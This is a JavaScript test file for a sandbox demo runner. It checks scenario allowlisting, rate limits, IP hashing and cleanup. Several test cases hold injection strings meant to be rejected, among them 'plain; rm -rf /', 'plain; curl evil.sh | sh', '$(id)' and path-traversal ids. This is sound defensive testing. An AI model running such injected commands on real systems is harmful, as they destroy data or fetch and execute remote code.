import test from 'node:test';
import assert from 'node:assert/strict';
import { BusyError, LIMITS, SCENARIOS, runCommandLine, runStatus, startRun, validate, visitorId } from '../lib/saga-sandbox.js';
import { UserError } from '../lib/snapshot.js';

// A fake @vercel/sandbox: records what the code asks for, and serves scripted files.
// `listed`: sandboxes the fake listing returns [{ name, status, createdAt, tags }]; `active` is a shortcut for running ones.
function fakeSdk({ active = [], listed = [], files = {}, getFails = false, statusOf } = {}) {
  const created = [];
  const stopped = [];
  const written = [];
  const commands = [];
  const reads = [];
  const handle = (name) => ({
    name,
    status: statusOf,
    async writeFiles(f) { written.push(...f); },
    async runCommand(c) { commands.push(c); return {}; },
    async readFileToBuffer({ path }) { reads.push(path); return path in files ? Buffer.from(files[path]) : null; },
    async stop() { stopped.push(name); },
  });
  const Sandbox = {
    async list({ tags }) { assert.deepEqual(tags, { app: 'pharos-agent-kit-demo' }); return [...active.map((n) => ({ name: n, status: 'running', createdAt: 0, tags: {} })), ...listed]; },
    async create(opts) { created.push(opts); return handle(opts.name); },
    async get({ name, resume }) { assert.equal(resume, false); if (getFails) throw new Error('not found'); return handle(name); },
  };
  return { Sandbox, created, stopped, written, commands, reads };
}
const opts = (sdk, extra = {}) => ({ Sandbox: sdk.Sandbox, random: () => 'abcd1234', ...extra });

test('scenarios are an allowlist, and the retry limit is 1 to 5', () => {
  assert.deepEqual(Object.keys(SCENARIOS), ['plain', 'retry', 'failure', 'stuck']);
  for (const bad of ['', 'success', 'plain; rm -rf /', '../x', undefined]) assert.throws(() => validate({ scenario: bad }), UserError);
  for (const bad of [0, 6, 2.5, 'x']) assert.throws(() => validate({ scenario: 'plain', maxAttempts: bad }), UserError);
  assert.deepEqual(validate({ scenario: 'retry', maxAttempts: '4' }), { scenario: 'retry', attempts: 4 });
});

test('the command line is one fixed template; the only variable parts are an allowlisted scenario and a digit', () => {
  const template = /^cd \/tmp\/demo-run\/app && PATH=\$HOME\/\.foundry\/bin:\$PATH node skills\/pharos-saga-executor\/scripts\/saga\.mjs --scenario (plain|retry|failure|stuck) --max-attempts [1-5] --stream > \/tmp\/demo-run\/run\.ndjson 2> \/tmp\/demo-run\/run\.err; echo \$\? > \/tmp\/demo-run\/run\.exit$/;
  for (const sc of Object.keys(SCENARIOS)) for (let n = 1; n <= 5; n++) assert.match(runCommandLine(sc, n), template);
  // whatever a visitor sends, startRun only ever passes validate()'s output to it
  for (const evil of ['plain; curl evil.sh | sh', 'plain --out /etc/passwd', '$(id)']) assert.throws(() => validate({ scenario: evil }), UserError);
});

test('a run boots from the snapshot with a locked-down network, short timeout and no persistence', async () => {
  const sdk = fakeSdk();
  const r = await startRun({ scenario: 'plain', maxAttempts: 3, ip: '1.1.1.1' }, opts(sdk));
  assert.equal(r.id, 'saga-plain-abcd1234');
  const c = sdk.created[0];
  assert.equal(c.source.type, 'snapshot');
  assert.match(c.source.snapshotId, /^snap_/);
  assert.deepEqual(c.networkPolicy, { allow: ['rpc.pharos.xyz'] });
  assert.equal(c.persistent, false);
  assert.equal(c.timeout, LIMITS.timeoutMs);
  assert.deepEqual(c.tags, { app: 'pharos-agent-kit-demo', demo: 'saga', visitor: visitorId('1.1.1.1') });
  assert.equal(JSON.stringify(c).includes('1.1.1.1'), false, 'the raw IP must not be stored anywhere');
  assert.ok(sdk.written.some((f) => f.path.endsWith('/app/skills/pharos-saga-executor/scripts/saga.mjs')));
  assert.ok(sdk.written.some((f) => f.path.endsWith('/app/package.json') && f.content.toString().includes('"module"')));
  assert.equal(sdk.commands.length, 1);
  assert.equal(sdk.commands[0].detached, true);
});

test('at most LIMITS.maxActive runs at once: the next gets a BusyError (HTTP 429)', async () => {
  const sdk = fakeSdk({ active: ['saga-plain-aaaaaaaa', 'saga-stuck-bbbbbbbb'] });
  await assert.rejects(startRun({ scenario: 'plain', ip: '2.2.2.2' }, opts(sdk)), (e) => e instanceof BusyError && e.httpStatus === 429 && /in progress/.test(e.message));
  assert.equal(sdk.created.length, 0);
});

const NOW = 10_000_000;
const row = (visitor, status, ageMs, name = `saga-plain-${Math.random().toString(36).slice(2, 10)}`) => ({ name, status, createdAt: NOW - ageMs, tags: { app: 'pharos-agent-kit-demo', visitor: visitorId(visitor) } });

test('limits come from the Sandbox listing, so they hold across serverless instances', async () => {
  // This visitor's last run was 3 s ago (finished): too soon. Another visitor is unaffected.
  const sdk = fakeSdk({ listed: [row('3.3.3.3', 'stopped', 3_000)] });
  await assert.rejects(startRun({ scenario: 'plain', ip: '3.3.3.3' }, opts(sdk, { now: () => NOW })), (e) => e instanceof BusyError && /wait \d+ seconds/.test(e.message));
  await startRun({ scenario: 'plain', ip: '4.4.4.4' }, opts(sdk, { now: () => NOW }));
  // After the cooldown the same visitor may run again.
  const later = fakeSdk({ listed: [row('3.3.3.3', 'stopped', LIMITS.cooldownMs + 1)] });
  await startRun({ scenario: 'plain', ip: '3.3.3.3' }, opts(later, { now: () => NOW }));
});

test('a visitor with a run in progress cannot start a second one, however it is sent', async () => {
  const sdk = fakeSdk({ listed: [row('6.6.6.6', 'running', 20_000)] });
  await assert.rejects(startRun({ scenario: 'retry', ip: '6.6.6.6' }, opts(sdk, { now: () => NOW })), (e) => e instanceof BusyError && /already have a run/.test(e.message));
  assert.equal(sdk.created.length, 0);
});

test('a global hourly cap protects the Vercel account from a loop of runs', async () => {
  const many = Array.from({ length: LIMITS.maxPerHour }, (_, i) => row(`10.0.0.${i}`, 'stopped', 60_000 + i));
  const sdk = fakeSdk({ listed: many });
  await assert.rejects(startRun({ scenario: 'plain', ip: '9.9.9.9' }, opts(sdk, { now: () => NOW })), (e) => e instanceof BusyError && /hourly limit/.test(e.message));
  // runs older than an hour do not count
  const old = fakeSdk({ listed: many.map((r) => ({ ...r, createdAt: NOW - 3_700_000 })) });
  await startRun({ scenario: 'plain', ip: '9.9.9.9' }, opts(old, { now: () => NOW }));
});

test('visitorId is a short hash: stable, and not the IP', () => {
  assert.equal(visitorId('1.2.3.4'), visitorId('1.2.3.4'));
  assert.notEqual(visitorId('1.2.3.4'), visitorId('1.2.3.5'));
  assert.match(visitorId('1.2.3.4'), /^[0-9a-f]{10}$/);
});

test('a failure while uploading stops the machine instead of leaking it', async () => {
  const sdk = fakeSdk();
  const orig = sdk.Sandbox.create;
  sdk.Sandbox.create = async (o) => { const h = await orig(o); h.writeFiles = async () => { throw new Error('disk full'); }; return h; };
  await assert.rejects(startRun({ scenario: 'plain', ip: '5.5.5.5' }, opts(sdk)), /disk full/);
  assert.deepEqual(sdk.stopped, ['saga-plain-abcd1234']);
});

test('run ids must match the exact pattern; anything else is rejected before touching the SDK', async () => {
  const sdk = fakeSdk();
  for (const bad of ['', undefined, '../../etc', 'saga-plain-abc', 'saga-other-abcd1234', 'saga-plain-ABCD1234', 'saga-plain-abcd1234 ']) {
    await assert.rejects(runStatus({ id: bad }, { Sandbox: sdk.Sandbox }), UserError, String(bad));
  }
});

const ND = (...lines) => lines.map((l) => JSON.stringify(l)).join('\n') + '\n';
const R = '/tmp/demo-run';

test('status while running: streams the events from an offset and keeps the machine alive', async () => {
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'phase', message: 'Fork ready', forkBlock: 123 }, { type: 'event', event: { t: 1, event: 'saga:start' } }, { type: 'event', event: { t: 2, event: 'step:start' } }) + '{"type":"ev' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234', from: 1 }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'running');
  assert.equal(s.forkBlock, 123);
  assert.equal(s.total, 2); // the half-written last line is ignored until it is complete
  assert.deepEqual(s.events.map((e) => e.event), ['step:start']);
  assert.deepEqual(sdk.stopped, []);
});

test('status when finished: returns the result and stops the machine', async () => {
  const record = { runs: [{ name: 'vault-saga:plain', status: 'completed' }], provenance: { anvil: 'anvil 1.4.0' } };
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'event', event: { t: 1, event: 'saga:completed' } }, { type: 'result', record }), [`${R}/run.exit`]: '0\n' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'done');
  assert.deepEqual(s.result, record);
  assert.deepEqual(sdk.stopped, ['saga-plain-abcd1234']);
});

test('status when the script died: failed, with the script’s own error', async () => {
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'error', message: 'anvil did not start' }), [`${R}/run.exit`]: '1\n', [`${R}/run.err`]: 'error: anvil did not start' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'failed');
  assert.match(s.error, /anvil did not start/);
});

test('status for a machine that is gone says so plainly', async () => {
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: fakeSdk({ getFails: true }).Sandbox });
  assert.equal(s.state, 'gone');
  assert.match(s.message, /Start a new run/);
});

test('a machine that is already stopped is reported gone WITHOUT reading from it (reading would resume it)', async () => {
  for (const status of ['stopped', 'stopping', 'failed', 'aborted', 'snapshotting']) {
    const sdk = fakeSdk({ statusOf: status, files: { [`${R}/run.exit`]: '0\n' } });
    const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
    assert.equal(s.state, 'gone', status);
    assert.deepEqual(sdk.reads, [], `${status}: must not touch its files`);
  }
});

test('a stop that throws is reported in the response instead of being hidden', async () => {
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'result', record: { runs: [] } }), [`${R}/run.exit`]: '0\n' } });
  const get = sdk.Sandbox.get;
  sdk.Sandbox.get = async (o) => { const h = await get(o); h.stop = async () => { throw new Error('permission denied'); }; return h; };
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'done');
  assert.equal(s.stopError, 'permission denied');
});
